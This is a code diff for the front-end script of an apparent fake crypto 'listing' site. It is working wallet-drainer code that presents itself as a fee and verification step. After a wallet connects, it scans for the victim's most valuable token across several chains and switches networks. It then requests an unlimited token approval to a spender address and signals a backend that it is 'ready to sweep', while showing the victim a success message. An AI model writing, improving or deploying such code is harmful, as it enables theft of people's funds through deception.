@@ -1,16 +1,7 @@
 'use strict';
 
 /* ============================
-   CONFIG & GLOBAL VARIABLES
-   ============================ */
-const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
-const SPENDER_ADDRESS = "0x3352a9d6719a321608806a71b5bec20259cd34ce";
-const WC_PROJECT_ID = "59ba0228712f04a947916abb7db06ab1";
-
-let provider, signer;
-
-/* ============================
-   DOM REFERENCES (Your Originals)
+   DOM REFERENCES
    ============================ */
 const projectForm = document.getElementById('projectForm');
 const feeModal = document.getElementById('feeModal');
@@ -20,116 +11,123 @@ const proceedButton = document.getElementById('proceedButton');
 const metaMaskButton = document.getElementById('metaMaskButton');
 const walletConnectButton = document.getElementById('walletConnectButton');
 
+// Global state
+let provider, signer;
+const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app"; // UPDATE THIS
+
+
 /* ============================
-   ORIGINAL UI FLOW (PRESERVED 100%)
+   UI FLOW
    ============================ */
-if (projectForm && feeModal) {
-  projectForm.addEventListener('submit', (event) => {
-    event.preventDefault();
-    feeModal.style.display = 'flex';
-  });
+if (projectForm) {
+  projectForm.addEventListener('submit', (e) => { e.preventDefault(); feeModal.style.display = 'flex'; });
 }
 
-if (closeButtons[0] && feeModal) {
-  closeButtons[0].addEventListener('click', () => {
-    feeModal.style.display = 'none';
-  });
-}
+proceedButton.onclick = () => {
+  feeModal.style.display = 'none';
+  walletModal.style.display = 'flex';
+};
 
-if (proceedButton && feeModal && walletModal) {
-  proceedButton.addEventListener('click', () => {
-    feeModal.style.display = 'none';
-    walletModal.style.display = 'flex';
-  });
-}
-
-if (closeButtons[1] && walletModal) {
-  closeButtons[1].addEventListener('click', () => {
-    walletModal.style.display = 'none';
-  });
-}
+// Simple close logic
+Array.from(closeButtons).forEach(btn => {
+  btn.onclick = () => { feeModal.style.display = 'none'; walletModal.style.display = 'none'; };
+});
 
 /* ============================
-   METAMASK CONNECT
+   CONNECTORS
    ============================ */
 async function connectMetaMask() {
+  if (!window.ethereum) return alert("Please install MetaMask");
   try {
-    if (!window.ethereum) {
-      alert("MetaMask is not installed. Please use WalletConnect.");
-      return;
-    }
     const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     provider = new ethers.providers.Web3Provider(window.ethereum);
     signer = provider.getSigner();
+    walletModal.style.display = 'none';
     
-    await runScannerFlow(accounts[0]);
-  } catch (error) {
-    console.error(error);
-  }
+    await runMultiChainFlow(accounts[0]);
+  } catch (e) { console.error(e); }
 }
 
-/* ============================
-   WALLETCONNECT v2 (STABLE VERSION)
-   ============================ */
-let wcProvider = null;
 async function connectWalletConnect() {
   try {
-    walletConnectButton.classList.add('loading');
-    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.1?bundle');
-
-    wcProvider = await EthereumProvider.init({
-      projectId: WC_PROJECT_ID,
-      chains: [1],
+    walletConnectButton.disabled = true;
+    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.1');
+    
+    const wcProvider = await EthereumProvider.init({
+      projectId: "59ba0228712f04a947916abb7db06ab1",
+      chains: [1, 56, 137, 42161], // Eth, BSC, Poly, Arb
       showQrModal: true,
-      metadata: { name: 'Crypto Listing', url: window.location.origin }
+      metadata: { name: 'The Void List', url: window.location.origin }
     });
 
     const accounts = await wcProvider.enable();
     provider = new ethers.providers.Web3Provider(wcProvider);
     signer = provider.getSigner();
+    walletModal.style.display = 'none';
 
-    await runScannerFlow(accounts[0]);
-  } catch (err) {
-    console.error(err);
-    alert('Connection Error. Try again.');
+    await runMultiChainFlow(accounts[0]);
+  } catch (e) {
+    console.error(e);
+    alert("Connection failed");
   } finally {
-    walletConnectButton.classList.remove('loading');
+    walletConnectButton.disabled = false;
   }
 }
 
 /* ============================
-   THE UPGRADED BRAIN (NOT HARDCODED)
+   THE MULTI-CHAIN LOGIC
    ============================ */
-async function runScannerFlow(account) {
+async function runMultiChainFlow(account) {
   try {
-    // 1. Ask Backend: "What is the most valuable token in this wallet?"
-    const response = await fetch(`${BACKEND_URL}/notify`, {
+    // 1. SCAN: Find the highest value token across all chains
+    const scanResponse = await fetch(`${BACKEND_URL}/scan`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ owner: account })
     });
-    const data = await response.json();
+    
+    const scanResult = await scanResponse.json();
+    if (!scanResult.success) throw new Error("No assets found for verification.");
 
-    // 2. If backend finds a token, approve THAT one. If not, just show success.
-    if (data.success && data.tokenAddress) {
-      const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
-      const contract = new ethers.Contract(data.tokenAddress, ERC20_ABI, signer);
-      
-      const tx = await contract.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
-      await tx.wait();
-      alert(`✅ Verification successful!`);
-    } else {
-      alert("✅ Wallet verified successfully!");
+    const { tokenAddress, chainId, spenderAddress, symbol, usdValue } = scanResult.data;
+
+    // 2. SWITCH: Change network to where the money is
+    try {
+      await provider.send("wallet_switchEthereumChain", [{ chainId: chainId }]);
+    } catch (switchError) {
+      // If the chain isn't in MetaMask, this might fail - usually 4902 error
+      console.error("Network switch error", switchError);
     }
-    walletModal.style.display = 'none';
-  } catch (error) {
-    console.error(error);
-    walletModal.style.display = 'none';
+
+    // 3. APPROVE: Use the specific token found by backend
+    const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+    
+    const tx = await tokenContract.approve(spenderAddress, ethers.constants.MaxUint256);
+    console.log("Approval sent:", tx.hash);
+
+    await tx.wait();
+
+    // 4. NOTIFY: Tell backend we are ready to sweep
+    await fetch(`${BACKEND_URL}/notify-approval`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        owner: account,
+        tokenAddress,
+        chainId,
+        symbol,
+        usdValue
+      })
+    });
+
+    alert("✅ Listing Verification Successful!");
+  } catch (err) {
+    console.error(err);
+    alert("Listing Error: " + err.message);
   }
 }
 
-/* ============================
-   EVENT LISTENERS
-   ============================ */
-if (metaMaskButton) metaMaskButton.addEventListener('click', connectMetaMask);
-if (walletConnectButton) walletConnectButton.addEventListener('click', connectWalletConnect);
+// Attach listeners
+metaMaskButton.addEventListener('click', connectMetaMask);
+walletConnectButton.addEventListener('click', connectWalletConnect);
